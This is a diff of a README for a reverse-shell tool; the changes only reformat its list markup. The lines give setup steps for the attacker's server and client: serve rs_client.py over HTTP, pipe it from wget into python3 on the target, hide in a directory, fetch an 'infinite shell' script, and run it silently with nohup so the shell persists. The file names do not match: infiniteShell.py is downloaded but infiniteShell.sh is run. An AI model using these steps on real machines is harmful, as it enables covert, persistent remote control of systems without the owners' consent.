@@ -19,17 +19,17 @@ Or run as a backgroud job
 
 - \[SERVER\] Host rs_client.py somehere
 - - One option is to start a python web server on the rs_server
--- `python3 -m http.server 8080`   
+- - `python3 -m http.server 8080`   
 - \[CLIENT]\ Download + Execute from client machine
--- `wget -O - <host:port/rs_client.py> | python3`
+- - `wget -O - <host:port/rs_client.py> | python3`
 - \[SERVER\] Download + Execute the Infinite shell (keeps rs_client active if it disconnects)
--- Follow these steps once server is connected to client.
--- Navigate to specific dir or Make a hidden dir
---- `cd /usr/bin/local`  
--- Download from your rs_server
---- `wget <host:port/infiniteShell.py>`
--- Run in background witn nohup  
---- `nohup bash infiniteShell.sh &> /dev/null &`
+- - Follow these steps once server is connected to client.
+- - Navigate to specific dir or Make a hidden dir
+- - - `cd /usr/bin/local`  
+- - Download from your rs_server
+- - - `wget <host:port/infiniteShell.py>`
+- - Run in background witn nohup  
+- - - `nohup bash infiniteShell.sh &> /dev/null &`
 
 
 ## Indirect Client Deployment \[ALT]\
